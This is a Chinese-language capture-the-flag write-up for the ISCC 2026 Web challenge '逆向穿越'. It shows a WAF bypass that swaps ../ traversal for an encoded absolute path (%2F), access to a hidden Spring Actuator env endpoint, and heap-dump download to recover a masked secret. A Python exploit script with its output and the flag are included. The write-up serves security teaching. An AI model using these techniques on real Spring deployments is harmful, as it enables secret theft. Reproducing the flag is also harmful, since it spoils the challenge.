# 逆向穿越

> **Category**: Web | **Difficulty**: Hard | **Competition**: ISCC 2026 区域赛
> **Flag**: `ISCC{Double_Decode_Spring_Bingo_2026}`

---

## Attack Chain

```
Spring Cloud Config → 绝对路径绕WAF → Actuator env端点 → Heap Dump下载 → 内存搜索明文flag
```

## Key Techniques

### 1. 信息收集与 WAF 绕过

发现 Spring Cloud Config Server，API 格式：`GET /config/{app}/{profile}/{filename}`

标准路径获取 mock 配置，提示真正的配置在 `/app/application.yml`。用 `../` 路径穿越被 WAF 拦截返回 403。

根据题目提示"倒着走路"，思路反转：**不用 `..` 往上跳，用绝对路径从根目录往下走**：

```
GET /config/app/dev/%2Fapp%2Fapplication.yml
```

- `%2F` 不被当作路径分隔符，URL 仍是 3 段结构，WAF 检测不到 `..` → 放行
- Tomcat 配置了 `ALLOW_ENCODED_SLASH=true`，将 `%2F` 解码为 `/`
- Java `Paths.resolve()` 遇到绝对路径参数直接返回 `/app/application.yml`

成功读到真实配置文件，获取隐藏 Actuator 路径和 heap dump 路径。

### 2. 访问隐藏 Actuator 端点

```yaml
management.endpoints.web.base-path: "/internal-monitor-xyz123"
management.endpoints.web.exposure.include: "env"
```

`FLAG` 环境变量被脱敏为 `******`，但获取到 heap dump 下载路径。

### 3. 下载 Heap Dump 提取明文 Flag

```
GET /api/v3/internal/dev/diagnostics/snapshot/8e2f1a4b.dat
```

文件头 `JAVA PROFILE 1.0.2`，确认是 HPROF 格式堆转储（26.4MB）。

关键原理：JVM 启动时将环境变量以 String 对象存入堆内存，堆转储包含所有 String 的明文。**Actuator 脱敏只在 HTTP 响应层生效，不影响内存数据。**

## Exploit

```python
import re, requests

BASE = "http://39.105.213.28:12602"

# Step 1: 绝对路径绕过 WAF，读取真实配置
r = requests.get(f"{BASE}/config/app/dev/%2Fapp%2Fapplication.yml")

# Step 2: Actuator env 端点
r = requests.get(f"{BASE}/internal-monitor-xyz123/env")
# FLAG = ****** (脱敏)
# 但获取到 SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH

# Step 3: 下载 heap dump
r = requests.get(f"{BASE}/api/v3/internal/dev/diagnostics/snapshot/8e2f1a4b.dat")
with open("heapdump.hprof", "wb") as f:
    f.write(r.content)

# Step 4: 搜索 FLAG 明文
flags = set(re.findall(b'ISCC{[^}]+}', r.content))
for flag in flags:
    print(f"[+] {flag.decode()}")
```

**运行结果：**

```
[*] Step 1: 绝对路径绕过 WAF → 成功读取真实配置
[*] Step 3: Actuator env → FLAG = ****** (脱敏)
[*] Step 4: 下载 heapdump → 27692349 bytes
[+] ISCC{Double_Decode_Spring_Bingo_2026}
```

## Distilled Knowledge

| 知识点 | 关键 |
|--------|------|
| URL编码绕过 | `%2F` 绕路径检测 + Tomcat解码 |
| Spring Actuator | 隐藏端点泄露环境变量 |
| Heap Dump | JVM堆转储含String明文 |
| 脱敏 vs 内存 | HTTP层脱敏不影响内存数据 |
| Paths.resolve | 绝对路径参数直接返回，不拼接 |

---

*Original writeup: `C:\Users\48714\Desktop\wp\区域赛\逆向穿越_WriteUp_final.md`*
